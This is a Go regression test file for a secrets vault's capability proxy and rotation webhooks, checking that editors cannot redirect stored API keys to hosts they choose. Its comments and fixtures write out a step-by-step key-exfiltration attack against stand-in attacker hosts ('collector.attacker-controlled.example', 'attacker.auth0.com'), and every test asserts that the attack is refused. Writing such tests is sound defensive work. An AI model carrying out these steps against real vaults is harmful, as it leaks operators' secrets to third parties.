package handlers

import (
	"bytes"
	"context"
	"database/sql"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"

	"github.com/bright-interaction/trustissues/internal/capability"
	"github.com/bright-interaction/trustissues/internal/db"
	timw "github.com/bright-interaction/trustissues/internal/middleware"
	"github.com/bright-interaction/trustissues/internal/vaultegress"
)

// testEgressVaultKey is the VaultKey newCollectionAuthzEnv builds its handler
// with; the capability handler derives its signing key from the same source in
// production, so the tests below do too.
const testEgressVaultKey = "kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"

// egressEnv is the real thing: migrated schema, real VaultHandler, real
// CapabilityHandler over the same connection, and a transport that records what
// actually went on the wire.
type egressEnv struct {
	vault   *VaultHandler
	queries *db.Queries
	cap     *CapabilityHandler
	wire    *recordingTransport
	router  http.Handler
}

func newEgressEnv(t *testing.T) *egressEnv {
	t.Helper()
	vh, queries := newCollectionAuthzEnv(t)
	capH, err := NewCapabilityHandler(vh.db, vh, testEgressVaultKey)
	if err != nil {
		t.Fatalf("NewCapabilityHandler: %v", err)
	}
	rt := &recordingTransport{}
	capH.SetHTTPClient(&http.Client{Timeout: 5 * time.Second, Transport: rt})
	router := chi.NewRouter()
	router.HandleFunc("/proxy/{host}/*", capH.Proxy)
	return &egressEnv{vault: vh, queries: queries, cap: capH, wire: rt, router: router}
}

// putDestinations drives the REAL PUT /api/vault/{id} as the given principal.
func (e *egressEnv) putDestinations(t *testing.T, userID, role, entryID string, dests []string) *httptest.ResponseRecorder {
	t.Helper()
	body, _ := json.Marshal(map[string]any{"destination_patterns": dests})
	rec := httptest.NewRecorder()
	e.vault.Update(rec, vaultAuthzRequest(http.MethodPut, "/api/vault/"+entryID, userID, role, entryID, string(body)))
	return rec
}

func (e *egressEnv) storedDestinations(t *testing.T, entryID string) string {
	t.Helper()
	row, err := e.queries.GetVaultEntryMeta(context.Background(), entryID)
	if err != nil {
		t.Fatalf("reload entry: %v", err)
	}
	return row.DestinationPatterns
}

// forceDestinations writes the ceiling straight into the database, bypassing
// every handler. It stands in for any writer that is not PUT /api/vault/{id}:
// an older binary, a restored backup, an import, the next second writer nobody
// has written yet. The delivery gate has to hold against those too, or it is
// just a second copy of the write check.
func (e *egressEnv) forceDestinations(t *testing.T, entryID, patternsJSON string) {
	t.Helper()
	if err := setDestinationPatternsFixture(t, e.queries, vaultegress.DestinationPatternsParams{DestinationPatterns: patternsJSON, ID: entryID}); err != nil {
		t.Fatalf("force destination patterns: %v", err)
	}
}

// issue drives the REAL POST /api/secrets/issue as the given principal.
func (e *egressEnv) issue(t *testing.T, userID string, req issueRequest) *httptest.ResponseRecorder {
	t.Helper()
	body, _ := json.Marshal(req)
	r := httptest.NewRequest(http.MethodPost, "/api/secrets/issue", bytes.NewReader(body))
	r = r.WithContext(context.WithValue(r.Context(), timw.UserIDKey, userID))
	rec := httptest.NewRecorder()
	e.cap.Issue(rec, r)
	return rec
}

// signToken mints a VALID token in-package, deliberately skipping Issue. The
// proxy is the authority: a mint-time refusal the delivery path does not back
// only moves the bypass one step, and this is how the test proves the delivery
// path itself refuses.
func signToken(t *testing.T, name, entryID, agent, dest, method string) string {
	t.Helper()
	key, err := capability.DeriveSigningKey(testEgressVaultKey)
	if err != nil {
		t.Fatalf("derive signing key: %v", err)
	}
	tok, err := capability.Sign(capability.Token{
		Secret: name, SecretID: entryID, Agent: agent,
		Dests: []string{dest}, Method: method,
	}, key, time.Minute)
	if err != nil {
		t.Fatalf("sign token: %v", err)
	}
	return tok
}

func (e *egressEnv) proxy(t *testing.T, method, host, path, token string) *httptest.ResponseRecorder {
	t.Helper()
	e.wire.reqs, e.wire.auth = nil, nil
	req := httptest.NewRequest(method, "/proxy/"+host+path, strings.NewReader(`{"model":"gpt-4"}`))
	req.Header.Set("Authorization", "Capability "+token)
	rec := httptest.NewRecorder()
	e.router.ServeHTTP(rec, req)
	return rec
}

// assertKeyNeverLeft is the assertion that matters. A status code says what the
// handler decided; this says what the upstream RECEIVED. A 200 with the key
// delivered elsewhere is the failure being tested for, so nothing here reads
// rec.Code.
func (e *egressEnv) assertKeyNeverLeft(t *testing.T, theKey string) {
	t.Helper()
	if len(e.wire.reqs) != 0 {
		t.Fatalf("the proxy reached %v carrying %v: the operator's key has already egressed",
			e.wire.reqs, e.wire.auth)
	}
	for _, a := range e.wire.auth {
		if strings.Contains(a, theKey) {
			t.Fatalf("the operator's key %q went out on the wire as %q", theKey, a)
		}
	}
}

// TestEditorCannotRepointAProviderKeyAtAHostTheyChose is the round-3 blocker,
// reproduced end to end and then closed.
//
// Round 2 scoped the capability bridge to the inference allowlist, keyed by the
// provider's API HOST. The gate held. So the attack stopped abusing the path and
// changed where the proxy POINTS instead:
//
//	STEP 1  PUT /api/vault/{id} {"destination_patterns":["collector.attacker-controlled.example/*"]}
//	STEP 2  POST /api/secrets/issue {"secret":"team-openai"}
//	STEP 3  POST /proxy/collector.attacker-controlled.example/collect
//	        -> 200, Authorization: Bearer sk-openai-OPERATOR-KEY
//
// Every check in the proxy agreed, because every one of them read a column the
// attacker had just written. PUT /api/vault/{id} is mounted for all roles and
// authorized by entryAccess -> grantFor row 5, which hands manage to any accepted
// collection EDITOR, a role a public-signup vault_only account can hold.
//
// It is an escalation even though a member can read a shared secret through
// /api/vault/unlock, because unlock re-verifies the caller's PASSWORD and this
// path does not: an API key alone (X-API-Key: ti_...) turns "use without seeing"
// into "see", which is the entire promise of the bridge.
//
// The invariant: an entry wired into the AI gateway is only ever delivered to
// that provider's own API host. Not because the ceiling says so (the attacker
// writes the ceiling) but because the pin is derived from an AdminOnly settings
// row and a compile-time host table. Asserted on what the fake upstream
// RECEIVED, at three layers: the write is refused, the mint is refused, and a
// validly signed token spent against a database that has ALREADY been rewritten
// still delivers nothing.
func TestEditorCannotRepointAProviderKeyAtAHostTheyChose(t *testing.T) {
	env := newEgressEnv(t)
	ctx := context.Background()

	const (
		entryID      = "entry-team-openai"
		theKey       = "sk-openai-OPERATOR-KEY"
		attackerHost = "collector.attacker-controlled.example"
		attackerDest = attackerHost + "/*"
	)

	operator := mustUser(t, env.queries, "operator@example.com", "user", "")
	// The reviewer's caller: the role RedeemInvitation hands out over the PUBLIC
	// invite endpoint, holding an accepted EDITOR seat on the team collection.
	attacker := mustUser(t, env.queries, "attacker@example.com", "vault_only", "")
	mustCollection(t, env.queries, "coll-team", operator, map[string]string{
		operator: collRoleManager,
		attacker: collRoleEditor,
	})
	mustEntry(t, env.vault, env.queries, entryID, operator, "team-openai", theKey)
	placeInCollection(t, env.queries, entryID, "coll-team")
	// The OpenAI preset's injection spec, which is what makes the key travel as
	// an Authorization header. Without it the positive control below could pass
	// for the wrong reason (nothing injected, nothing to leak).
	if _, err := env.vault.db.Exec(`UPDATE vault_entries SET injection_spec = ? WHERE id = ?`,
		`{"type":"bearer"}`, entryID); err != nil {
		t.Fatalf("seed injection spec: %v", err)
	}

	// The operator sets the conservative preset ceiling on their own entry (the
	// legitimate path: creator, and the pin is not up yet).
	if rec := env.putDestinations(t, operator, "user", entryID, []string{"api.openai.com/*"}); rec.Code != http.StatusOK {
		t.Fatalf("ABORT: the entry's creator could not set the ceiling: %d %s", rec.Code, rec.Body.String())
	}
	// An admin points the gateway at it (PUT /api/settings/ai is AdminOnly).
	if err := env.queries.UpsertSetting(ctx, db.UpsertSettingParams{Key: "ai_key_openai", Value: entryID}); err != nil {
		t.Fatalf("wire the gateway: %v", err)
	}

	t.Run("STEP 1: the ceiling rewrite is refused and nothing is stored", func(t *testing.T) {
		rec := env.putDestinations(t, attacker, "vault_only", entryID, []string{attackerDest})
		if rec.Code != http.StatusForbidden {
			t.Fatalf("PUT rewriting the ceiling: HTTP %d, want 403 (body: %s)", rec.Code, rec.Body.String())
		}
		if got := env.storedDestinations(t, entryID); strings.Contains(got, attackerHost) {
			t.Fatalf("the attacker's host was stored anyway: destination_patterns = %s", got)
		}
	})

	t.Run("not even the creator can point the gateway key somewhere else", func(t *testing.T) {
		// The pin is not a permission check, it is a property of the entry: while
		// an admin has the instance pointed at this secret, the only place it
		// goes is that provider. Otherwise the stored row would claim a
		// destination the proxy will always refuse, which reads as a bug at
		// exactly the moment somebody is trying to understand a refusal. The way
		// out is documented in the message: unwire it in Settings > AI gateway.
		rec := env.putDestinations(t, operator, "user", entryID, []string{"api.openai.com/*", attackerDest})
		if rec.Code != http.StatusForbidden {
			t.Fatalf("the creator widening a pinned entry: HTTP %d, want 403 (body: %s)", rec.Code, rec.Body.String())
		}
		if !strings.Contains(rec.Body.String(), "destination_pinned") {
			t.Errorf("the refusal should name the pin, got %s", rec.Body.String())
		}
		if got := env.storedDestinations(t, entryID); strings.Contains(got, attackerHost) {
			t.Fatalf("stored anyway: %s", got)
		}
	})

	t.Run("STEP 2: minting for the attacker's host is refused", func(t *testing.T) {
		rec := env.issue(t, attacker, issueRequest{
			Secret: "team-openai", AgentID: "attacker-agent", Dests: []string{attackerDest},
		})
		if rec.Code == http.StatusCreated {
			t.Fatalf("a capability token was minted for %s: %s", attackerDest, rec.Body.String())
		}
	})

	// Everything above depends on the write path. The next two do not: the
	// database now says, in the column every check reads, that the operator's
	// provider key may be sent to the attacker's collector.
	env.forceDestinations(t, entryID, `["`+attackerDest+`","api.openai.com/*"]`)

	t.Run("STEP 2 with the ceiling already rewritten in the database", func(t *testing.T) {
		rec := env.issue(t, attacker, issueRequest{
			Secret: "team-openai", AgentID: "attacker-agent-2", Dests: []string{attackerDest},
		})
		if rec.Code != http.StatusForbidden {
			t.Fatalf("minting against a rewritten ceiling: HTTP %d, want 403 (body: %s)", rec.Code, rec.Body.String())
		}
		if !strings.Contains(rec.Body.String(), "destination_pinned") {
			t.Errorf("the refusal should name the pin, got %s", rec.Body.String())
		}
	})

	t.Run("STEP 3: a valid token plus a rewritten ceiling delivers nothing", func(t *testing.T) {
		// A token this server would sign, for a destination the stored ceiling
		// now allows, spent against the real proxy. Both destination checks say
		// yes here; only the pin refuses.
		tok := signToken(t, "team-openai", entryID, "attacker-agent-3", attackerDest, "*")
		rec := env.proxy(t, http.MethodPost, attackerHost, "/collect", tok)
		env.assertKeyNeverLeft(t, theKey)
		if rec.Code != http.StatusForbidden {
			t.Fatalf("proxying to the attacker's host: HTTP %d, want 403 (body: %s)", rec.Code, rec.Body.String())
		}
		if body := rec.Body.String(); !strings.Contains(body, "destination_pinned") {
			t.Errorf("the refusal should name the pin, got %s", body)
		}
		if !strings.Contains(rec.Body.String(), "api.openai.com") {
			t.Errorf("the refusal should tell the operator where this key IS allowed to go, got %s", rec.Body.String())
		}
	})

	t.Run("the refusal is audited", func(t *testing.T) {
		var n int
		if err := env.vault.db.QueryRow(
			`SELECT COUNT(*) FROM capability_log WHERE event = 'denied' AND error = 'destination_outside_provider_pin'`).Scan(&n); err != nil {
			t.Fatalf("count capability_log: %v", err)
		}
		if n == 0 {
			t.Error("a provider key aimed at somebody else's host left no audit row")
		}
	})

	t.Run("the legitimate inference call still delivers the key", func(t *testing.T) {
		// The positive control. Without it, a fix that simply broke the bridge
		// would pass every assertion above.
		tok := signToken(t, "team-openai", entryID, "good-agent", "api.openai.com/*", "POST")
		rec := env.proxy(t, http.MethodPost, "api.openai.com", "/v1/chat/completions", tok)
		if rec.Code != http.StatusOK {
			t.Fatalf("the allowed inference call: HTTP %d, want 200 (body: %s)", rec.Code, rec.Body.String())
		}
		if len(env.wire.reqs) != 1 || env.wire.reqs[0] != "POST api.openai.com/v1/chat/completions" {
			t.Fatalf("the bridge sent %v, want one POST api.openai.com/v1/chat/completions", env.wire.reqs)
		}
		if env.wire.auth[0] != "Bearer "+theKey {
			t.Fatalf("the real key must still reach the provider, got %q", env.wire.auth[0])
		}
	})

	t.Run("an editor may still NARROW the ceiling", func(t *testing.T) {
		// Narrowing is how agent access is revoked, so it must stay open to
		// anyone with manage. This also proves the 403s above are about
		// widening, not about the editor being locked out of the field.
		env.forceDestinations(t, entryID, `["api.openai.com/*"]`)
		rec := env.putDestinations(t, attacker, "vault_only", entryID, []string{"api.openai.com/v1/chat/completions"})
		if rec.Code != http.StatusOK {
			t.Fatalf("narrowing the ceiling: HTTP %d, want 200 (body: %s)", rec.Code, rec.Body.String())
		}
		if got := env.storedDestinations(t, entryID); !strings.Contains(got, "/v1/chat/completions") {
			t.Fatalf("the narrowing was not stored: %s", got)
		}
		// ... and clearing it, the documented per-secret revocation.
		if rec := env.putDestinations(t, attacker, "vault_only", entryID, []string{}); rec.Code != http.StatusOK {
			t.Fatalf("clearing the ceiling: HTTP %d, want 200 (body: %s)", rec.Code, rec.Body.String())
		}
	})

	t.Run("a rotation webhook cannot be pointed at the attacker either", func(t *testing.T) {
		// The sibling door: deliverToWebhook POSTs {"new_value": <the secret>} to
		// a URL the caller names, and an accepted editor may configure targets.
		// Same property, same answer.
		loaded := httptest.NewRecorder()
		env.vault.GetTargets(loaded, vaultAuthzRequest(http.MethodGet, "/api/vault/"+entryID+"/targets", attacker, "vault_only", entryID, ""))
		if loaded.Code != http.StatusOK {
			t.Fatalf("ABORT: the editor could not load the rotation panel: %d %s", loaded.Code, loaded.Body.String())
		}
		var panel struct {
			Version string `json:"version"`
		}
		if err := json.Unmarshal(loaded.Body.Bytes(), &panel); err != nil {
			t.Fatalf("decode targets panel: %v", err)
		}
		body := `[{"type":"webhook","webhook_url":"https://` + attackerHost + `/collect","label":"x"}]`
		rec := httptest.NewRecorder()
		env.vault.UpdateTargets(rec, vaultAuthzRequest(http.MethodPut,
			"/api/vault/"+entryID+"/targets?version="+panel.Version, attacker, "vault_only", entryID, body))
		if rec.Code != http.StatusForbidden {
			t.Fatalf("configuring a delivery target on the gateway key: HTTP %d, want 403 (body: %s)", rec.Code, rec.Body.String())
		}
		if !strings.Contains(rec.Body.String(), "destination_pinned") {
			t.Errorf("the refusal should name the pin, got %s", rec.Body.String())
		}
	})

	t.Run("delivery refuses a target that is already stored", func(t *testing.T) {
		// The write above is refused, so plant one the way an older binary would
		// have and prove DELIVERY refuses it too.
		results := DeliverRotatedKey(ctx, env.queries, env.vault, entryID, "team-openai",
			env.vault.MintedEntrySecret([]byte("old"), entryID, "team-openai"),
			env.vault.MintedEntrySecret([]byte("new-secret-value"), entryID, "team-openai"),
			[]RotationTarget{{Type: "webhook", WebhookURL: "https://" + attackerHost + "/collect", ConfiguredBy: operator}}, operator)
		if len(results) != 1 || results[0].Success {
			t.Fatalf("delivery to a pinned entry's webhook must fail, got %+v", results)
		}
		if !strings.Contains(results[0].Error, "AI provider key") {
			t.Errorf("the delivery refusal should say why, got %q", results[0].Error)
		}
	})
}

// TestEditorCannotWidenTheEgressCeilingOfAnyoneElsesSecret is the general rule
// behind the pin, on an ordinary shared secret with no AI provider anywhere near
// it.
//
// The pin only covers the entry an admin wired into the gateway. Every OTHER
// shared secret is exposed by the same shape: an accepted editor rewrites the
// ceiling and /proxy delivers the plaintext to a host they named, without ever
// knowing the caller's password. So the right to ADD a destination belongs to
// the principal who deposited the secret (its creator) or an instance admin, and
// manage alone is not enough.
func TestEditorCannotWidenTheEgressCeilingOfAnyoneElsesSecret(t *testing.T) {
	env := newEgressEnv(t)

	const (
		entryID = "entry-team-stripe"
		theKey  = "sk_live_TEAM_STRIPE"
	)
	owner := mustUser(t, env.queries, "stripe-owner@example.com", "user", "")
	editor := mustUser(t, env.queries, "stripe-editor@example.com", "user", "")
	manager := mustUser(t, env.queries, "stripe-manager@example.com", "user", "")
	admin := mustUser(t, env.queries, "stripe-admin@example.com", "admin", "")
	mustCollection(t, env.queries, "coll-pay", owner, map[string]string{
		owner:   collRoleEditor,
		editor:  collRoleEditor,
		manager: collRoleManager,
	})
	mustEntry(t, env.vault, env.queries, entryID, owner, "team-stripe", theKey)
	placeInCollection(t, env.queries, entryID, "coll-pay")
	env.forceDestinations(t, entryID, `["api.stripe.com/*"]`)

	widen := []string{"api.stripe.com/*", "collector.attacker-controlled.example/*"}

	for _, c := range []struct {
		name, user, role string
	}{
		{"an accepted editor", editor, "user"},
		{"a collection manager who did not create it", manager, "user"},
	} {
		t.Run(c.name+" cannot add a host", func(t *testing.T) {
			rec := env.putDestinations(t, c.user, c.role, entryID, widen)
			if rec.Code != http.StatusForbidden {
				t.Fatalf("widening: HTTP %d, want 403 (body: %s)", rec.Code, rec.Body.String())
			}
			if !strings.Contains(rec.Body.String(), "egress_widening_denied") {
				t.Errorf("the refusal should name the reason, got %s", rec.Body.String())
			}
			if got := env.storedDestinations(t, entryID); strings.Contains(got, "attacker-controlled") {
				t.Fatalf("the host was stored anyway: %s", got)
			}
		})
	}

	t.Run("an editor cannot smuggle a host in through a provider preset", func(t *testing.T) {
		// seedCapabilityDefaults is the ceiling column's other writer. Three
		// presets expand a tenant value out of provider_meta, which an editor can
		// set, so enrolling a provider was a ceiling write with the host in the
		// caller's hands: {tenant}.auth0.com with tenant="attacker" seeds
		// attacker.auth0.com/*, and anyone can register that.
		//
		// Round 3 answered this by storing the provider and SKIPPING the seed, so
		// this case expected 200 with an empty ceiling. Round 4 showed why that
		// was half an answer: the stored provider + provider_meta pair is a
		// destination in its own right, independent of the ceiling column. The
		// rotation scheduler and POST /api/vault/{id}/validate both read it and
		// dial "https://attacker.auth0.com" carrying the decrypted secret,
		// touching destination_patterns at no point. So the WRITE is refused now,
		// not merely the seed.
		env.forceDestinations(t, entryID, `[]`)
		body, _ := json.Marshal(map[string]any{"provider": "auth0", "provider_meta": `{"tenant":"attacker"}`})
		rec := httptest.NewRecorder()
		env.vault.Update(rec, vaultAuthzRequest(http.MethodPut, "/api/vault/"+entryID, editor, "user", entryID, string(body)))
		if rec.Code != http.StatusForbidden {
			t.Fatalf("enrolling a provider on somebody else's secret: HTTP %d, want 403 (body: %s)", rec.Code, rec.Body.String())
		}
		if !strings.Contains(rec.Body.String(), "egress_widening_denied") {
			t.Errorf("the refusal should name the reason, got %s", rec.Body.String())
		}
		if got := env.storedDestinations(t, entryID); strings.Contains(got, "attacker") {
			t.Fatalf("the preset seeded a host the editor chose: %s", got)
		}
		// And the provider pair itself must not be stored, or the scheduler still
		// has the attacker's host to dial.
		row, err := env.queries.GetVaultEntryMeta(context.Background(), entryID)
		if err != nil {
			t.Fatalf("reload entry: %v", err)
		}
		if row.Provider.String == "auth0" {
			t.Fatalf("the provider was stored anyway; provider_meta then names the host the "+
				"rotation scheduler dials: provider=%q", row.Provider.String)
		}
	})

	t.Run("an editor cannot seed the ceiling by re-saving an unchanged provider", func(t *testing.T) {
		// The narrower version of the case above, and the one an ablation found
		// nothing covering.
		//
		// With provider_meta carrying an attacker tenant the provider WRITE is
		// refused, so the seed is never reached and the seed's own gate is
		// untested. Re-saving a provider that is already stored changes no host at
		// all, so it sails past the write gate, and seedCapabilityDefaults then
		// turns an entry whose owner deliberately left the ceiling EMPTY (no agent
		// may spend this secret) into one with a live destination. That is a
		// ceiling write in everything but name, and it belongs to the owner.
		if err := setProviderFixture(t, env.queries, vaultegress.ProviderParams{
			Provider: sql.NullString{String: "stripe", Valid: true},
			ID:       entryID,
		}); err != nil {
			t.Fatalf("establish the provider: %v", err)
		}
		env.forceDestinations(t, entryID, `[]`)

		body, _ := json.Marshal(map[string]any{"provider": "stripe"})
		rec := httptest.NewRecorder()
		env.vault.Update(rec, vaultAuthzRequest(http.MethodPut, "/api/vault/"+entryID, editor, "user", entryID, string(body)))
		if rec.Code != http.StatusOK {
			t.Fatalf("ABORT: re-saving an unchanged provider was refused (%d: %s), so this subtest never "+
				"reaches the seed it is about", rec.Code, rec.Body.String())
		}
		if got := env.storedDestinations(t, entryID); got != "[]" {
			t.Errorf("an editor's no-op provider save seeded the capability ceiling: %s\n"+
				"The owner had left it empty, which is how a secret is kept off the agent bridge "+
				"entirely, and enrolling a preset is the same act as writing the ceiling by hand", got)
		}

		// The positive half, or the fix is just a broken feature: the owner doing
		// exactly the same thing DOES get the preset.
		rec = httptest.NewRecorder()
		env.vault.Update(rec, vaultAuthzRequest(http.MethodPut, "/api/vault/"+entryID, owner, "user", entryID, string(body)))
		if rec.Code != http.StatusOK {
			t.Fatalf("the owner could not enrol a provider on their own secret: %d %s", rec.Code, rec.Body.String())
		}
		if got := env.storedDestinations(t, entryID); !strings.Contains(got, "api.stripe.com") {
			t.Errorf("the owner's provider enrolment did not seed the preset: %s", got)
		}
	})

	t.Run("the creator and an instance admin still can", func(t *testing.T) {
		env.forceDestinations(t, entryID, `["api.stripe.com/*"]`)
		if rec := env.putDestinations(t, owner, "user", entryID, widen); rec.Code != http.StatusOK {
			t.Fatalf("the entry's creator was refused: %d %s", rec.Code, rec.Body.String())
		}
		env.forceDestinations(t, entryID, `["api.stripe.com/*"]`)
		if rec := env.putDestinations(t, admin, "admin", entryID, widen); rec.Code != http.StatusOK {
			t.Fatalf("an instance admin was refused: %d %s", rec.Code, rec.Body.String())
		}
	})

	t.Run("a departed creator cannot widen on their way out", func(t *testing.T) {
		// grantFor row 7 keeps a removed creator's residual READ so they can
		// recover their own secret. That is recovery, not a licence to redirect
		// a collection's secret after being removed from it.
		env.forceDestinations(t, entryID, `["api.stripe.com/*"]`)
		if _, err := env.queries.RemoveCollectionMember(context.Background(), db.RemoveCollectionMemberParams{
			CollectionID: "coll-pay", UserID: owner,
		}); err != nil {
			t.Fatalf("remove the creator from the collection: %v", err)
		}
		rec := env.putDestinations(t, owner, "user", entryID, widen)
		if rec.Code == http.StatusOK {
			t.Fatalf("a departed creator widened the ceiling: %s", env.storedDestinations(t, entryID))
		}
		// Asserted on the rule itself as well as on the route. The route also
		// refuses them at entryAccess (no manage, so a 404), which means the HTTP
		// assertion above would keep passing if the rule below started saying
		// yes: a right that is only enforced by the caller that happens to check
		// first is one refactor away from being no rule at all.
		if env.vault.mayDirectSecretEgress(context.Background(), owner, false, entryID) {
			t.Error("mayDirectSecretEgress says a creator who is no longer a member may still redirect " +
				"the secret; row 7's residual right is recovery, not continued control")
		}
	})
}

// TestDestinationCoverageMatchesTheMatcher pins the widen/narrow decision to the
// grammar the capability matcher actually honours.
//
// If coverage were more generous than capability.patternMatch, a "narrowing"
// would authorise a pattern the matcher then treats as wider, and the widening
// gate would have a hole shaped exactly like a glob.
func TestDestinationCoverageMatchesTheMatcher(t *testing.T) {
	cases := []struct {
		ceiling, candidate string
		covered            bool
	}{
		{"api.openai.com/*", "api.openai.com/v1/chat/completions", true},
		{"api.openai.com/*", "api.openai.com/v1/*", true},
		{"api.openai.com/*", "api.openai.com", true},
		{"api.openai.com/v1/*", "api.openai.com/v1/chat", true},
		{"api.openai.com/v1/*", "api.openai.com/v2/chat", false},
		{"api.openai.com/v1/*", "api.openai.com/*", false},
		{"api.openai.com/*", "collector.attacker.example/*", false},
		{"api.openai.com/*", "API.OPENAI.COM/v1/models", true},
		// A bare host covers its sub-paths, the way patternMatch does.
		{"api.openai.com", "api.openai.com/v1/models", true},
		{"api.openai.com/v1/models", "api.openai.com/v1/models/gpt-4", true},
		{"api.openai.com/v1/models", "api.openai.com/v1/modelsX", false},
		// A stored host wildcard covers nothing: destMatches refuses to honour
		// those rows, so it must not authorise adding a sibling either.
		{"*.supabase.co/*", "attacker.supabase.co/*", false},
		{"", "api.openai.com/*", false},
	}
	for _, c := range cases {
		if got := destinationCovers(c.ceiling, c.candidate); got != c.covered {
			t.Errorf("destinationCovers(%q, %q) = %v, want %v", c.ceiling, c.candidate, got, c.covered)
		}
		if c.covered {
			// Agreement with the matcher: anything the ceiling covers must also
			// MATCH under the ceiling, for a concrete request under it.
			host, path := splitHostPath(strings.TrimSuffix(strings.ToLower(c.candidate), "/*"))
			if path == "" {
				path = "/probe"
			}
			if !destMatches([]string{c.ceiling}, host, path) {
				t.Errorf("coverage says %q is inside %q, but destMatches refuses %s%s",
					c.candidate, c.ceiling, host, path)
			}
		}
	}

	if got := widenedDestinations([]string{"api.openai.com/*"}, []string{"api.openai.com/v1/*"}); len(got) != 0 {
		t.Errorf("narrowing reported as widening: %v", got)
	}
	if got := widenedDestinations([]string{"api.openai.com/*"}, []string{"api.openai.com/*", "evil.example/*"}); len(got) != 1 {
		t.Errorf("adding a host must report a widening, got %v", got)
	}
	if got := widenedDestinations(nil, []string{"api.openai.com/*"}); len(got) != 1 {
		t.Errorf("setting a ceiling on an entry that had none is a widening, got %v", got)
	}
}
